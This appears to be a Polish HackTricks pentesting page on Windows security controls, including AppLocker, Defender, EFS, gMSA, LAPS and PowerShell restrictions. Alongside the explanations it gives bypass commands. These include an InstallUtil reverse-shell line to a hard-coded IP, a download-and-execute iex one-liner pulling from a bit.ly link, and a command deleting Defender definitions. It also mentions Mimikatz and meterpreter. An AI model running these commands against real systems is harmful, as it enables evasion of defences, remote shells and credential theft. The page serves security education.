# Kontrole zabezpieczeń Windows

{{#include ../banners/hacktricks-training.md}}

## Zasady AppLocker

Whitelist aplikacji to lista zatwierdzonych aplikacji lub plików wykonywalnych, których obecność i uruchamianie w systemie są dozwolone. Jej celem jest ochrona środowiska przed szkodliwym malware i niezatwierdzonym oprogramowaniem, które nie odpowiada konkretnym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to rozwiązanie firmy Microsoft do **whitelistingu aplikacji**, które daje administratorom systemów kontrolę nad tym, **jakie aplikacje i pliki mogą uruchamiać użytkownicy**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami Instalatora Windows, bibliotekami DLL, aplikacjami spakowanymi i instalatorami spakowanych aplikacji.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz dostęp z prawem zapisu do określonych katalogów, **ale wszystko to można obejść**.

### Sprawdzenie

Sprawdź, które pliki/rozszerzenia znajdują się na czarnej/białej liście:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
`Test-AppLockerPolicy` ocenia pliki kandydujące dla określonej tożsamości względem zasad AppLocker. Przetestuj konto, którego token wykona payload, ponieważ reguły mogą dotyczyć użytkowników lub grup; `Get-AppLockerFileInformation` jest również przydatne do sprawdzania ścieżki, hash i metadanych wydawcy, na podstawie których reguły mogą dopasowywać pliki.<sup>[[5]](#references)</sup>
```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```
Ta ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, zapewniając sposób na sprawdzenie bieżącego zestawu reguł wymuszanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Przydatne **Writable folders** do bypassowania zasad AppLocker: Jeśli AppLocker zezwala na wykonywanie dowolnych plików wewnątrz `C:\Windows\System32` lub `C:\Windows`, istnieją **writable folders**, których można użyć, aby **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Powszechnie **zaufane** binaria [**„LOLBAS's”**](https://lolbas-project.github.io/) również mogą być przydatne do omijania AppLocker.
- **Nieprawidłowo napisane reguły również mogą być omijane**
- Na przykład w przypadku **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** możesz utworzyć **folder o nazwie `allowed`** w dowolnym miejscu, a będzie on dozwolony.
- Organizacje często koncentrują się również na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych** [**lokalizacjach plików wykonywalnych PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
- **Wymuszanie kontroli DLL jest bardzo rzadko włączane** ze względu na dodatkowe obciążenie systemu oraz ilość testów wymaganych do upewnienia się, że nic nie przestanie działać. Dlatego używanie **DLL jako backdoorów pomoże ominąć AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać** kod **Powershell** w dowolnym procesie i ominąć AppLocker. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Przechowywanie danych uwierzytelniających

### Security Accounts Manager (SAM)

Lokalne dane uwierzytelniające znajdują się w tym pliku, a hasła są zahashowane.

### Local Security Authority (LSA) - LSASS

**Dane uwierzytelniające** (zahashowane) są **zapisywane** w **pamięci** tego podsystemu na potrzeby Single Sign-On.\
**LSA** administruje lokalną **polityką bezpieczeństwa** (polityką haseł, uprawnieniami użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA sprawdza **podane dane uwierzytelniające** w pliku **SAM** (podczas logowania lokalnego) oraz komunikuje się z **kontrolerem domeny**, aby uwierzytelnić użytkownika domenowego.

**Dane uwierzytelniające** są **zapisywane** wewnątrz **procesu LSASS**: bilety Kerberos, hashe NT i LM, hasła możliwe do łatwego odszyfrowania.

### Sekrety LSA

LSA może zapisywać na dysku niektóre dane uwierzytelniające:

- Hasło konta komputera w Active Directory (niedostępny kontroler domeny).
- Hasła kont usług Windows
- Hasła zadań zaplanowanych
- Inne (hasło aplikacji IIS...)

### NTDS.dit

Jest to baza danych Active Directory. Występuje wyłącznie na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to program antywirusowy dostępny w systemach Windows 10 i Windows 11 oraz w wersjach Windows Server. **Blokuje** typowe narzędzia pentestingowe, takie jak **`WinPEAS`**. Istnieją jednak sposoby na **ominięcie tych zabezpieczeń**.

### Sprawdzanie

Aby sprawdzić **status** programu **Defender**, możesz wykonać PS cmdlet **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy jest aktywny):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby również go wyliczyć, możesz uruchomić:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS zabezpiecza pliki za pomocą szyfrowania, wykorzystując **klucz symetryczny** znany jako **File Encryption Key (FEK)**. Ten klucz jest szyfrowany za pomocą **klucza publicznego** użytkownika i przechowywany w **alternatywnym strumieniu danych** $EFS zaszyfrowanego pliku. Gdy potrzebne jest odszyfrowanie, odpowiadający mu **klucz prywatny** certyfikatu cyfrowego użytkownika służy do odszyfrowania FEK ze strumienia $EFS. Więcej informacji można znaleźć [tutaj](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariusze odszyfrowywania bez inicjowania przez użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików nieobsługującego EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są automatycznie odszyfrowywane.
- Zaszyfrowane pliki wysyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania umożliwia właścicielowi **transparentny dostęp** do zaszyfrowanych plików. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi ich odszyfrowania.

**Najważniejsze informacje**:

- EFS używa symetrycznego FEK, szyfrowanego za pomocą klucza publicznego użytkownika.
- Odszyfrowywanie wykorzystuje klucz prywatny użytkownika w celu uzyskania dostępu do FEK.
- Automatyczne odszyfrowywanie następuje w określonych warunkach, takich jak kopiowanie do FAT32 lub transmisja przez sieć.
- Zaszyfrowane pliki są dostępne dla właściciela bez wykonywania dodatkowych czynności.

### Sprawdzanie informacji EFS

Sprawdź, czy **użytkownik** **używał** tej **usługi**, sprawdzając, czy istnieje ta ścieżka:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Sprawdź, **kto** ma **dostęp** do pliku, używając cipher /c \<file>\
Możesz również użyć `cipher /e` i `cipher /d` wewnątrz folderu, aby **zaszyfrować** i **odszyfrować** wszystkie pliki

### Odszyfrowywanie plików EFS

#### Bycie Authority System

To podejście wymaga, aby **użytkownik będący ofiarą** miał **uruchomiony** **proces** na hoście. Jeśli tak jest, z sesji `meterpreter` możesz podszyć się pod token procesu użytkownika (`impersonate_token` z `incognito`). Alternatywnie możesz wykonać `migrate` do procesu użytkownika.

#### Znajomość hasła użytkownika

Mimikatz może zaimportować certyfikat użytkownika i klucz prywatny, a następnie użyć ich do odszyfrowania plików chronionych przez EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft opracował **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, w których często włączone jest ustawienie "**Password never expire**", gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatyczne zarządzanie hasłami**: gMSA używają złożonego, 240-znakowego hasła, które automatycznie zmienia się zgodnie z zasadami domeny lub komputera. Proces ten jest obsługiwany przez Microsoft Key Distribution Service (KDC), eliminując potrzebę ręcznego aktualizowania haseł.
- **Zwiększone bezpieczeństwo**: Te konta są odporne na blokady i nie mogą być używane do logowania interaktywnego, co zwiększa ich bezpieczeństwo.
- **Obsługa wielu hostów**: gMSA mogą być współdzielone między wieloma hostami, dzięki czemu idealnie nadają się do usług uruchamianych na wielu serwerach.
- **Obsługa zaplanowanych zadań**: W przeciwieństwie do managed service accounts, gMSA obsługują uruchamianie zaplanowanych zadań.
- **Uproszczone zarządzanie SPN**: System automatycznie aktualizuje Service Principal Name (SPN), gdy zmieniają się dane sAMaccount komputera lub jego nazwa DNS, upraszczając zarządzanie SPN.

Hasła gMSA są przechowywane we właściwości LDAP _**msDS-ManagedPassword**_ i automatycznie resetowane co 30 dni przez Domain Controllers (DCs). To hasło, będące zaszyfrowanym obiektem danych znanym jako [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), może być pobierane wyłącznie przez autoryzowanych administratorów oraz serwery, na których zainstalowano gMSA, co zapewnia bezpieczne środowisko. Aby uzyskać dostęp do tych informacji, wymagane jest zabezpieczone połączenie, takie jak LDAPS, albo połączenie musi być uwierzytelnione za pomocą 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Możesz odczytać to hasło za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Znajdź więcej informacji w tym poście**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Sprawdź również tę [stronę internetową](https://cube0x0.github.io/Relaying-for-gMSA/) opisującą, jak przeprowadzić **NTLM relay attack**, aby **odczytać** **hasło** **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Podczas enumeracji rozróżniaj **legacy Microsoft LAPS** od natywnej implementacji **Windows LAPS**. Windows LAPS został wydany wraz z aktualizacjami Windows z 11 kwietnia 2023 roku i może tworzyć kopię zarządzanego hasła lokalnego administratora w **Windows Server Active Directory** lub **Microsoft Entra ID**. W przypadku wdrożeń opartych na AD może dodatkowo szyfrować hasła, przechowywać zaszyfrowaną historię haseł oraz zarządzać hasłem DSRM kontrolera domeny. Możliwy do pobrania starszy pakiet MSI jest przestarzały w nowszych wersjach Windows, chociaż Windows LAPS może działać w trybie emulacji starszego rozwiązania.<sup>[[6]](#references)</sup>

Ponieważ legacy Microsoft LAPS i Windows LAPS są oddzielnymi implementacjami, przed zastosowaniem ataków zależnych od atrybutów lub cmdletów ustal, która z nich została wdrożona. Powiązana strona opisuje wykrywanie, enumerację ACL, pobieranie, modyfikowanie wygasania oraz odzyskiwanie offline, dlatego nie powielamy tutaj tych procedur.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blokuje wiele funkcji** potrzebnych do efektywnego korzystania z PowerShell, takich jak blokowanie obiektów COM, zezwalanie wyłącznie na zatwierdzone typy .NET, workflows oparte na XAML, klasy PowerShell i inne.

### **Sprawdź**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
W obecnych wersjach Windows ten Bypass nie będzie działać, ale możesz użyć [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, może być konieczne** **dodanie** _**odwołania**_ -> _Przeglądaj_ -> _Przeglądaj_ -> dodanie `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` oraz **zmiana projektu na .Net4.5**.

#### Bezpośredni bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać kod Powershell** w dowolnym procesie i ominąć tryb constrained. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Zasady wykonywania PS

Domyślnie ustawiona jest wartość **restricted.** Główne sposoby ominięcia tej zasady:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Więcej informacji można znaleźć [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Interfejs dostawcy obsługi zabezpieczeń (SSPI)

Jest to API, którego można używać do uwierzytelniania użytkowników.

SSPI odpowiada za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. Następnie SSPI negocjuje, który protokół uwierzytelniania zostanie użyty. Protokoły te nazywają się Security Support Provider (SSP), znajdują się na każdej maszynie Windows w postaci biblioteki DLL, a obie maszyny muszą obsługiwać ten sam protokół, aby móc się komunikować.

### Główne SSP

- **Kerberos**: Preferowany
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Ze względów kompatybilności
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serwery webowe i LDAP, hasło w postaci hasha MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Służy do negocjowania używanego protokołu (Kerberos lub NTLM, przy czym Kerberos jest domyślny)
- %windir%\Windows\System32\lsasrv.dll

#### Negocjacja może oferować kilka metod lub tylko jedną.

## UAC - Kontrola konta użytkownika

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca **wyświetlanie monitu o zgodę na działania wymagające podwyższonych uprawnień**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}



## References

- [1] [Omijanie AppLocker i trybu ograniczonego języka PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [howto ~ odszyfrowywanie plików EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying dla gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 sposobów na ominięcie zasad wykonywania PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Korzystanie z cmdletów AppLocker programu Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Omówienie Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
{{#include ../banners/hacktricks-training.md}}
